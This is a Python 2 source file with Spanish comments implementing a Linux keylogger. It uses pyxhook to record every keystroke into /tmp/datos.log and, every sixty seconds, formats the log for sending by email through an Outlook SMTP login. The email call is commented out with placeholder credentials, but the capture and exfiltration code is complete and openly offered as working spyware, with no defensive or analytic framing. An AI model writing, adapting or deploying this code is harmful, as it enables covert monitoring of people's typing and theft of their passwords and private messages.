import pyxhook
import time, datetime
import smtplib

#Fichero donde se van a guardar  las pulsaciones
log_file='/tmp/datos.log'

dict_key = {
	"Shift_R": "",
	"Shift_L": "",
	"space":" ",
	"period":".",
	"Return":"\n",
	"[65027]":"[Alt Gr]",
	"colon":":",
	"semicolon":';',
	"comma":',',
	"slash":'/',
	"underscore":'_',
	"Tab":'[Tab]		',
	"ntilde":'ny',
	"plus":'*',
	"BackSpace":'[Borrar]',
	"ampersand":'&',
	"parenleft":'(',
	"parenright":')',
	"equal":'=',
	"quotedbl": '"',
	"exclam":'!',
	"question":'?',
	"Down":'[Down]',
	"Left":'[Left]',
	"Right":'[Right]',
	"Up":'[Up]'
}

#Esta funcion es llamada cuando se presiona una tecla
def OnKeyPress(event):
	fob=open(log_file,'a')

	if (event.Ascii == 50):
		fob.write("@")
	elif(event.Ascii == 51):
		fob.write("#")
	elif (event.Ascii == 52):
		fob.write("~")
	else:
		fob.write(dict_key.get(event.Key, event.Key))

	#print ("letra presionada: "+event.Key+' codigo ascii: ')
	#print (event.Ascii)

	if (event.Ascii==90): #90 es el valor ascii de (Z)
		fob.close()
		new_hook.cancel()


def TimeOut():
	if time.time() > timeout:
		return True
	else:
		return False


def SendEmail(user, pwd, recipient, subject, body):

	gmail_user = user
	gmail_pass = pwd
	FROM = user
	TO = recipient if type(recipient) is list else [recipient]  #Validamos si es a mas de una persona quien enviamos el correo
	SUBJECT = subject
	TEXT = body

	message = """\From: %s\nTo: %s\nSubject: %s\n\n%s""" % (FROM, ", ".join(TO), SUBJECT, TEXT)
	try:
		server = smtplib.SMTP("smtp-mail.outlook.com", 587)
		server.ehlo()
		server.starttls()
		server.login(gmail_user, gmail_pass)
		server.sendmail(FROM, TO, message)
		server.close()
		print 'Correo enviado satisfactoriamente'
	except:
		print 'Error al mandar correo!'


def FormatAndSendLogEmail():
	with open(log_file, 'r+') as f:
		actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
		data = f.read().replace('\n','')
		data = 'Log capturado a las: '+actualdate+ '\n' + data
		# SendEmail('youremail@...', 'password', 'youremail@...', 'Nuevo log - '+actualdate, data)
		f.seek(0)		#0 para apuntar al principio del fichero
		f.truncate()	#Trunca el fichero ( borra todo lo que hay)


wait_seconds =60;
timeout = time.time() + wait_seconds


#Instancia la clase hookManager
new_hook=pyxhook.HookManager()

#Escucha a todas las pulsaciones
new_hook.KeyDown=OnKeyPress

#Vigila elementos del teclado
new_hook.HookKeyboard()

#Empieza la sesion
new_hook.start()

while True:
	if TimeOut():
		FormatAndSendLogEmail()
		timeout = time.time() + wait_seconds #Tiempo limite en segundos, lo igualamos al tiempo actual mas los segundos a esperar
